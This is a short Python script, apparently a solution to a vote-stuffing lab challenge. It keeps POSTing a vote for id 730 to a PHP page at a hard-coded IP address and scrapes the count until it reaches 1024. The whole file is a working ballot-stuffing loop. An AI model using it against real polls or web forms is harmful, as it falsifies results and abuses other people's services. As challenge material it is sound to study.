from lxml import html
import requests
import time

def req_values(url):
    page = requests.get(url)
    tree = html.fromstring(page.content)
    me = tree.xpath(next_val)
    return ([page, tree, me])

try:
    url = 'http://158.69.76.135/level0.php'
    data = {'id':'730','holdthedoor':'submit'}
    next_val = '//td[contains(text(), "730")]/following-sibling::node()/text()'

    page, tree, me = req_values(url)
    while ("".join(me) != '\n1024    '):
        page, tree, me = req_values(url)
        status = requests.post(url, data)
        print("{} {}".format(status ,me))
except:
    print("Connection refused by the server ...")
    print("Let me sleep one moment")
    print("zzZZZZZZzZZzz...")
    time.sleep(120)
    print("Was a nice sleep, now let me continue...")
    pass
